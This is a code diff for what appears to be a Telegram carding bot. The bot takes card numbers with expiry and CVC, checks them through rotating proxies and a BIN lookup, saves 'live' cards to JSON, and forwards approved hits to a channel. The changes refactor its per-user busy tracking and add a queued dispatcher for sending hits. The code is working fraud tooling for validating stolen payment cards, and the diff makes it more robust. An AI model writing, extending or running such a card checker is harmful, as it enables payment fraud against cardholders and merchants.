@@ -8,8 +8,20 @@ from bininfo import round_robin_bin_lookup
 from proxy_manager import get_user_proxy
 import pycountry
 from runtime_config import get_default_site
-from shared_state import user_busy
-from shared_state import save_live_cc_to_json, try_process_with_retries
+from shared_state import (
+    is_user_busy,
+    set_user_busy,
+    clear_user_busy,
+    save_live_cc_to_json,
+    try_process_with_retries,
+)
+
+_dispatcher = None
+
+
+def set_dispatcher(dispatcher):
+    global _dispatcher
+    _dispatcher = dispatcher
 
 # ✅ Per-user locks
 user_locks = {}
@@ -71,12 +83,12 @@ def process_manual_check(bot, message, allowed_users):
     start_time = time.perf_counter()
     chat_id = str(message.chat.id)
     # 🚦 Prevent running if already busy
-    if user_busy.get(chat_id):
+    if is_user_busy(chat_id):
         bot.send_message(chat_id, "⚠ You already have an active check running.")
         return
 
     # 🟢 Mark this user as busy
-    user_busy[chat_id] = True
+    set_user_busy(chat_id, "manual")
         
     text = message.text.strip()
 
@@ -174,7 +186,7 @@ def process_manual_check(bot, message, allowed_users):
             parts = card_data.split("|")
             if len(parts) != 4:
                 bot.send_message(chat_id, "❌ Invalid card format. Use card|month|year|cvc")
-                user_busy[chat_id] = False
+                clear_user_busy(chat_id)
                 return
 
             n, mm, yy, cvc = [p.strip() for p in parts]
@@ -182,19 +194,19 @@ def process_manual_check(bot, message, allowed_users):
             # Card number validation
             if not n.isdigit() or len(n) < 13 or len(n) > 19:
                 bot.send_message(chat_id, "❌ Your card number is incorrect.")
-                user_busy[chat_id] = False
+                clear_user_busy(chat_id)
                 return
 
             # Expiry month validation
             if not mm.isdigit() or int(mm) < 1 or int(mm) > 12:
                 bot.send_message(chat_id, "❌ Invalid expiry month.")
-                user_busy[chat_id] = False
+                clear_user_busy(chat_id)
                 return
 
             # Expiry year validation (supports YY or YYYY)
             if not yy.isdigit():
                 bot.send_message(chat_id, "❌ Invalid expiry year.")
-                user_busy[chat_id] = False
+                clear_user_busy(chat_id)
                 return
 
             if len(yy) == 2:
@@ -206,13 +218,13 @@ def process_manual_check(bot, message, allowed_users):
             current_year = datetime.now().year
             if yy_int < current_year or yy_int > current_year + 10:
                 bot.send_message(chat_id, "❌ Invalid expiry year.")
-                user_busy[chat_id] = False
+                clear_user_busy(chat_id)
                 return
 
             # CVC validation
             if not cvc.isdigit() or len(cvc) not in (3, 4):
                 bot.send_message(chat_id, "❌ Your card number is incorrect.")
-                user_busy[chat_id] = False
+                clear_user_busy(chat_id)
                 return
 
                         
@@ -474,20 +486,27 @@ def process_manual_check(bot, message, allowed_users):
         # ✅ Forward live hits to channel (same design as final message)
         if final_status in ("PAYMENT_ADDED", "Card Added", "APPROVED", "CCN", "INSUFFICIENT_FUNDS", "CVV"):
             try:
-                bot.send_message(
-                    CHANNEL_ID,
-                    final_msg,  # ← send the same design
-                    parse_mode="HTML",
-                    disable_web_page_preview=True
-                )
+                if _dispatcher:
+                    _dispatcher.enqueue(
+                        "send_message",
+                        CHANNEL_ID,
+                        final_msg,
+                        parse_mode="HTML",
+                        disable_web_page_preview=True,
+                    )
+                else:
+                    bot.send_message(
+                        CHANNEL_ID,
+                        final_msg,  # ← send the same design
+                        parse_mode="HTML",
+                        disable_web_page_preview=True
+                    )
             except Exception:
                 pass
 
-    # ... your existing main checking logic above ...
-
     # 🧩 Always release lock and mark user not busy — even if errors occur
     finally:
-        user_busy[chat_id] = False
+        clear_user_busy(chat_id)
         try:
             if "lock" in locals() and lock.locked():
                 lock.release()
